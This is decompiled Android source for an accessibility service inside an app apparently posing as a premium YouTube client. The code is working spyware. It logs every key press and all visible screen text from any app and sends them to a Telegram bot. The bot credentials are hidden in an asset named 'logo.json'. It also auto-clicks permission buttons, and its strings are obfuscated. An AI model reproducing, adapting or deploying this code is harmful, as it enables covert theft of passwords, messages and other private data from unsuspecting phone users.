package com.w8sb.w8premiumyt;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.List;
import java.util.Locale;
import kotlin.Metadata;
import kotlin.Pair;
import kotlin.Unit;
import kotlin.collections.CollectionsKt;
import kotlin.io.CloseableKt;
import kotlin.io.TextStreamsKt;
import kotlin.jvm.functions.Function1;
import kotlin.jvm.internal.Intrinsics;
import kotlin.text.Charsets;
import kotlin.text.StringsKt;
import org.json.JSONObject;

/* JADX INFO: compiled from: W8AccessibilityService.kt */
/* JADX INFO: loaded from: /storage/emulated/0/Android/data/com.dastanapps.androiddevtools/files/decompiled/com.yt.phantombabar/dex/classes3.dex */
@Metadata(d1 = {"\u00006\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0002\b\u0003\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0004\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u000b\n\u0002\u0018\u0002\n\u0002\b\u0004\b\u0007\u0018\u00002\u00020\u0001B\u0005¢\u0006\u0002\u0010\u0002J\u0012\u0010\u0007\u001a\u00020\b2\b\u0010\t\u001a\u0004\u0018\u00010\nH\u0002J\u0010\u0010\u000b\u001a\u00020\u00042\u0006\u0010\f\u001a\u00020\u0004H\u0002J\u0012\u0010\r\u001a\u00020\b2\b\u0010\u000e\u001a\u0004\u0018\u00010\u000fH\u0016J\b\u0010\u0010\u001a\u00020\bH\u0016J\u0012\u0010\u0011\u001a\u00020\u00122\b\u0010\u000e\u001a\u0004\u0018\u00010\u0013H\u0014J\b\u0010\u0014\u001a\u00020\bH\u0014J\u0010\u0010\u0015\u001a\u00020\b2\u0006\u0010\u0016\u001a\u00020\u0004H\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0004X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u0006\u001a\u00020\u0004X\u0082\u000e¢\u0006\u0002\n\u0000¨\u0006\u0017"}, d2 = {"Lcom/w8sb/w8premiumyt/W8AccessibilityService;", "Landroid/accessibilityservice/AccessibilityService;", "()V", "botToken", "", "chatId", "lastSentText", "autoClickAllowButton", "", "node", "Landroid/view/accessibility/AccessibilityNodeInfo;", "getAppName", "pkg", "onAccessibilityEvent", "event", "Landroid/view/accessibility/AccessibilityEvent;", "onInterrupt", "onKeyEvent", "", "Landroid/view/KeyEvent;", "onServiceConnected", "sendToTelegram", "msg", "app_debug"}, k = 1, mv = {1, 8, 0}, xi = 48)
public final class W8AccessibilityService extends AccessibilityService {
    public static final int $stable = W8AccessibilityService2.INSTANCE.m۱۴۲۷Int$classW8AccessibilityService();
    private String botToken = "";
    private String chatId = "";
    private String lastSentText = "";

    @Override // android.accessibilityservice.AccessibilityService
    protected void onServiceConnected() {
        try {
            InputStream inputStreamOpen = getAssets().open(W8AccessibilityService2.INSTANCE.m۱۴۵۷String$arg0$callopen$$$this$callbufferedReader$$$this$calluse$valconfigStr$try$funonServiceConnected$classW8AccessibilityService());
            Intrinsics.checkNotNullExpressionValue(inputStreamOpen, "assets.open(\"logo.json\")");
            Reader inputStreamReader = new InputStreamReader(inputStreamOpen, Charsets.UTF_8);
            BufferedReader bufferedReader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
            try {
                BufferedReader it = bufferedReader;
                String configStr = TextStreamsKt.readText(it);
                CloseableKt.closeFinally(bufferedReader, (Throwable) null);
                JSONObject config = new JSONObject(configStr);
                String string = config.getString(W8AccessibilityService2.INSTANCE.m۱۴۵۳String$arg0$callgetString$arg0$call$setbotToken$$try$funonServiceConnected$classW8AccessibilityService());
                Intrinsics.checkNotNullExpressionValue(string, "config.getString(\"bot_token\")");
                this.botToken = string;
                String string2 = config.getString(W8AccessibilityService2.INSTANCE.m۱۴۵۴String$arg0$callgetString$arg0$call$setchatId$$try$funonServiceConnected$classW8AccessibilityService());
                Intrinsics.checkNotNullExpressionValue(string2, "config.getString(\"chat_id\")");
                this.chatId = string2;
            } finally {
            }
        } catch (Exception e) {
        }
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = 6192;
        info.feedbackType = 16;
        info.flags = 48;
        setServiceInfo(info);
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String pkg;
        String text;
        String eventText;
        if (event == null) {
        }
        CharSequence packageName = event.getPackageName();
        if (packageName == null || (pkg = packageName.toString()) == null) {
            pkg = W8AccessibilityService2.INSTANCE.m۱۴۷۲String$branch$when$valpkg$funonAccessibilityEvent$classW8AccessibilityService();
        }
        String appName = getAppName(pkg);
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (event.getEventType() == 32 || event.getEventType() == 2048) {
            autoClickAllowButton(root);
        }
        StringBuilder allText = new StringBuilder();
        onAccessibilityEvent$extractText(allText, root);
        String string = allText.toString();
        Intrinsics.checkNotNullExpressionValue(string, "allText.toString()");
        String fullText = StringsKt.trim(string).toString();
        if ((event.getEventType() == 16 || event.getEventType() == 32 || event.getEventType() == 2048 || event.getEventType() == 4096) && (!StringsKt.isBlank(fullText)) && !Intrinsics.areEqual(fullText, this.lastSentText)) {
            this.lastSentText = fullText;
            sendToTelegram(W8AccessibilityService2.INSTANCE.m۱۴۳۳String$0$str$arg0$callsendToTelegram$branch$if2$funonAccessibilityEvent$classW8AccessibilityService() + appName + W8AccessibilityService2.INSTANCE.m۱۴۴۱String$2$str$arg0$callsendToTelegram$branch$if2$funonAccessibilityEvent$classW8AccessibilityService() + pkg + W8AccessibilityService2.INSTANCE.m۱۴۴۶String$4$str$arg0$callsendToTelegram$branch$if2$funonAccessibilityEvent$classW8AccessibilityService() + fullText);
        }
        switch (event.getEventType()) {
            case 16:
                List<CharSequence> text2 = event.getText();
                if (text2 == null || (text = CollectionsKt.joinToString$default(text2, W8AccessibilityService2.INSTANCE.m۱۴۵۵String$arg0$calljoinToString$else$when$valtmp4_elvis_lhs$valtext$branch$when$funonAccessibilityEvent$classW8AccessibilityService(), (CharSequence) null, (CharSequence) null, 0, (CharSequence) null, (Function1) null, 62, (Object) null)) == null) {
                    text = W8AccessibilityService2.INSTANCE.m۱۴۷۳String$branch$when$valtext$branch$when$funonAccessibilityEvent$classW8AccessibilityService();
                }
                sendToTelegram(W8AccessibilityService2.INSTANCE.m۱۴۳۴String$0$str$arg0$callsendToTelegram$branch$when$funonAccessibilityEvent$classW8AccessibilityService() + text + W8AccessibilityService2.INSTANCE.m۱۴۴۲String$2$str$arg0$callsendToTelegram$branch$when$funonAccessibilityEvent$classW8AccessibilityService() + appName + W8AccessibilityService2.INSTANCE.m۱۴۴۷String$4$str$arg0$callsendToTelegram$branch$when$funonAccessibilityEvent$classW8AccessibilityService() + pkg);
                break;
            case 32:
                sendToTelegram(W8AccessibilityService2.INSTANCE.m۱۴۳۵String$0$str$arg0$callsendToTelegram$branch1$when$funonAccessibilityEvent$classW8AccessibilityService() + appName + W8AccessibilityService2.INSTANCE.m۱۴۴۳String$2$str$arg0$callsendToTelegram$branch1$when$funonAccessibilityEvent$classW8AccessibilityService() + pkg);
                List<CharSequence> text3 = event.getText();
                if (text3 == null || (eventText = CollectionsKt.joinToString$default(text3, W8AccessibilityService2.INSTANCE.m۱۴۵۶String$arg0$calljoinToString$else$when$valtmp6_elvis_lhs$valeventText$branch1$when$funonAccessibilityEvent$classW8AccessibilityService(), (CharSequence) null, (CharSequence) null, 0, (CharSequence) null, (Function1) null, 62, (Object) null)) == null) {
                    eventText = W8AccessibilityService2.INSTANCE.m۱۴۷۰String$branch$when$valeventText$branch1$when$funonAccessibilityEvent$classW8AccessibilityService();
                }
                if (!StringsKt.isBlank(eventText)) {
                    sendToTelegram(W8AccessibilityService2.INSTANCE.m۱۴۳۱String$0$str$arg0$callsendToTelegram$branch$if$branch1$when$funonAccessibilityEvent$classW8AccessibilityService() + eventText + W8AccessibilityService2.INSTANCE.m۱۴۳۹String$2$str$arg0$callsendToTelegram$branch$if$branch1$when$funonAccessibilityEvent$classW8AccessibilityService() + appName + W8AccessibilityService2.INSTANCE.m۱۴۴۴String$4$str$arg0$callsendToTelegram$branch$if$branch1$when$funonAccessibilityEvent$classW8AccessibilityService() + pkg);
                }
                break;
        }
    }

    private static final void onAccessibilityEvent$extractText(StringBuilder allText, AccessibilityNodeInfo node) {
        if (node == null) {
            return;
        }
        if (node.getText() != null) {
            Intrinsics.checkNotNullExpressionValue(node.getText(), "node.text");
            if (!StringsKt.isBlank(r0)) {
                allText.append(node.getText()).append(W8AccessibilityService2.INSTANCE.m۱۴۴۹String$arg0$callappend$branch$if1$funextractText$funonAccessibilityEvent$classW8AccessibilityService());
            }
        }
        int childCount = node.getChildCount();
        for (int i = 0; i < childCount; i++) {
            onAccessibilityEvent$extractText(allText, node.getChild(i));
        }
    }

    @Override // android.accessibilityservice.AccessibilityService
    protected boolean onKeyEvent(KeyEvent event) {
        String pkg;
        CharSequence packageName;
        boolean z = false;
        if (event != null && event.getAction() == 0) {
            z = true;
        }
        if (z) {
            String key = KeyEvent.keyCodeToString(event.getKeyCode());
            AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
            if (rootInActiveWindow == null || (packageName = rootInActiveWindow.getPackageName()) == null || (pkg = packageName.toString()) == null) {
                pkg = W8AccessibilityService2.INSTANCE.m۱۴۷۱String$branch$when$valpkg$branch$if$funonKeyEvent$classW8AccessibilityService();
            }
            String appName = getAppName(pkg);
            sendToTelegram(W8AccessibilityService2.INSTANCE.m۱۴۳۲String$0$str$arg0$callsendToTelegram$branch$if$funonKeyEvent$classW8AccessibilityService() + key + W8AccessibilityService2.INSTANCE.m۱۴۴۰String$2$str$arg0$callsendToTelegram$branch$if$funonKeyEvent$classW8AccessibilityService() + appName + W8AccessibilityService2.INSTANCE.m۱۴۴۵String$4$str$arg0$callsendToTelegram$branch$if$funonKeyEvent$classW8AccessibilityService() + pkg);
        }
        return super.onKeyEvent(event);
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onInterrupt() {
    }

    private final String getAppName(String pkg) {
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo appInfo = pm.getApplicationInfo(pkg, W8AccessibilityService2.INSTANCE.m۱۴۲۶Int$arg1$callgetApplicationInfo$valappInfo$try$fungetAppName$classW8AccessibilityService());
            Intrinsics.checkNotNullExpressionValue(appInfo, "pm.getApplicationInfo(pkg, 0)");
            return pm.getApplicationLabel(appInfo).toString();
        } catch (Exception e) {
            return pkg;
        }
    }

    private final void sendToTelegram(String msg) {
        Pair pair;
        if (!StringsKt.contains$default(msg, W8AccessibilityService2.INSTANCE.m۱۴۵۱String$arg0$callcontains$cond$if$valtmp0_container$funsendToTelegram$classW8AccessibilityService(), false, 2, (Object) null)) {
            pair = new Pair(msg, (Object) null);
        } else {
            pair = new Pair(W8AccessibilityService2.INSTANCE.m۱۴۲۸String$$this$callplus$$this$callplus$arg0$call$init$$branch$if$valtmp0_container$funsendToTelegram$classW8AccessibilityService() + StringsKt.replace$default(StringsKt.replace$default(msg, W8AccessibilityService2.INSTANCE.m۱۴۵۹String$arg0$callreplace$$$this$callreplace$arg0$callplus$$this$callplus$arg0$call$init$$branch$if$valtmp0_container$funsendToTelegram$classW8AccessibilityService(), W8AccessibilityService2.INSTANCE.m۱۴۶۷String$arg1$callreplace$$$this$callreplace$arg0$callplus$$this$callplus$arg0$call$init$$branch$if$valtmp0_container$funsendToTelegram$classW8AccessibilityService(), false, 4, (Object) null), W8AccessibilityService2.INSTANCE.m۱۴۶۰String$arg0$callreplace$arg0$callplus$$this$callplus$arg0$call$init$$branch$if$valtmp0_container$funsendToTelegram$classW8AccessibilityService(), W8AccessibilityService2.INSTANCE.m۱۴۶۸String$arg1$callreplace$arg0$callplus$$this$callplus$arg0$call$init$$branch$if$valtmp0_container$funsendToTelegram$classW8AccessibilityService(), false, 4, (Object) null) + W8AccessibilityService2.INSTANCE.m۱۴۵۸String$arg0$callplus$arg0$call$init$$branch$if$valtmp0_container$funsendToTelegram$classW8AccessibilityService(), W8AccessibilityService2.INSTANCE.m۱۴۶۳String$arg1$call$init$$branch$if$valtmp0_container$funsendToTelegram$classW8AccessibilityService());
        }
        final String formattedMsg = (String) pair.component1();
        final String parseMode = (String) pair.component2();
        AsyncTask.execute(new Runnable() { // from class: com.w8sb.w8premiumyt.W8AccessibilityService$$ExternalSyntheticLambda0
            @Override // java.lang.Runnable
            public final void run() {
                W8AccessibilityService.sendToTelegram$lambda$2(this.f$0, formattedMsg, parseMode);
            }
        });
    }

    private static final void sendToTelegram$lambda$2(W8AccessibilityService this$0, String $formattedMsg, String $parseMode) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        Intrinsics.checkNotNullParameter($formattedMsg, "$formattedMsg");
        try {
            URL url = new URL(W8AccessibilityService2.INSTANCE.m۱۴۲۹String$0$str$arg0$call$init$$valurl$try$fun$anonymous$$arg0$callexecute$funsendToTelegram$classW8AccessibilityService() + this$0.botToken + W8AccessibilityService2.INSTANCE.m۱۴۳۷String$2$str$arg0$call$init$$valurl$try$fun$anonymous$$arg0$callexecute$funsendToTelegram$classW8AccessibilityService());
            StringBuilder body = new StringBuilder();
            body.append(W8AccessibilityService2.INSTANCE.m۱۴۳۰String$0$str$arg0$callappend$$this$callappend$try$fun$anonymous$$arg0$callexecute$funsendToTelegram$classW8AccessibilityService() + this$0.chatId + W8AccessibilityService2.INSTANCE.m۱۴۳۸String$2$str$arg0$callappend$$this$callappend$try$fun$anonymous$$arg0$callexecute$funsendToTelegram$classW8AccessibilityService()).append(URLEncoder.encode($formattedMsg, W8AccessibilityService2.INSTANCE.m۱۴۶۶String$arg1$callencode$arg0$callappend$try$fun$anonymous$$arg0$callexecute$funsendToTelegram$classW8AccessibilityService()));
            if ($parseMode != null) {
                body.append(W8AccessibilityService2.INSTANCE.m۱۴۴۸String$arg0$callappend$$this$callappend$branch$if$try$fun$anonymous$$arg0$callexecute$funsendToTelegram$classW8AccessibilityService()).append($parseMode);
            }
            URLConnection uRLConnectionOpenConnection = url.openConnection();
            Intrinsics.checkNotNull(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
            HttpURLConnection conn = (HttpURLConnection) uRLConnectionOpenConnection;
            conn.setRequestMethod(W8AccessibilityService2.INSTANCE.m۱۴۶۱String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$callexecute$funsendToTelegram$classW8AccessibilityService());
            conn.setDoOutput(W8AccessibilityService2.INSTANCE.m۱۴۲۵Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$callexecute$funsendToTelegram$classW8AccessibilityService());
            conn.setRequestProperty(W8AccessibilityService2.INSTANCE.m۱۴۶۲String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$callexecute$funsendToTelegram$classW8AccessibilityService(), W8AccessibilityService2.INSTANCE.m۱۴۶۹String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$callexecute$funsendToTelegram$classW8AccessibilityService());
            OutputStream outputStream = conn.getOutputStream();
            try {
                OutputStream it = outputStream;
                String string = body.toString();
                Intrinsics.checkNotNullExpressionValue(string, "body.toString()");
                byte[] bytes = string.getBytes(Charsets.UTF_8);
                Intrinsics.checkNotNullExpressionValue(bytes, "this as java.lang.String).getBytes(charset)");
                it.write(bytes);
                Unit unit = Unit.INSTANCE;
                CloseableKt.closeFinally(outputStream, (Throwable) null);
                InputStream inputStream = conn.getInputStream();
                Intrinsics.checkNotNullExpressionValue(inputStream, "conn.inputStream");
                Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
                TextStreamsKt.readText(inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192));
                conn.disconnect();
            } finally {
            }
        } catch (Exception e) {
        }
    }

    private final void autoClickAllowButton(AccessibilityNodeInfo node) {
        if (node == null) {
            return;
        }
        if (Intrinsics.areEqual(node.getClassName(), W8AccessibilityService2.INSTANCE.m۱۴۶۵String$arg1$callEQEQ$cond$cond$if1$funautoClickAllowButton$classW8AccessibilityService()) && node.getText() != null) {
            Log.d(W8AccessibilityService2.INSTANCE.m۱۴۵۲String$arg0$calld$branch$if1$funautoClickAllowButton$classW8AccessibilityService(), W8AccessibilityService2.INSTANCE.m۱۴۳۶String$0$str$arg1$calld$branch$if1$funautoClickAllowButton$classW8AccessibilityService() + ((Object) node.getText()));
        }
        if (Intrinsics.areEqual(node.getClassName(), W8AccessibilityService2.INSTANCE.m۱۴۶۴String$arg1$callEQEQ$cond$cond$cond$cond$if2$funautoClickAllowButton$classW8AccessibilityService()) && node.isClickable() && node.isEnabled() && node.getText() != null) {
            String text = StringsKt.trim(node.getText().toString()).toString().toLowerCase(Locale.ROOT);
            Intrinsics.checkNotNullExpressionValue(text, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            if (StringsKt.contains$default(text, W8AccessibilityService2.INSTANCE.m۱۴۵۰String$arg0$callcontains$cond$if$branch$if2$funautoClickAllowButton$classW8AccessibilityService(), false, 2, (Object) null)) {
                node.performAction(16);
            }
        }
        int childCount = node.getChildCount();
        for (int i = 0; i < childCount; i++) {
            autoClickAllowButton(node.getChild(i));
        }
    }
}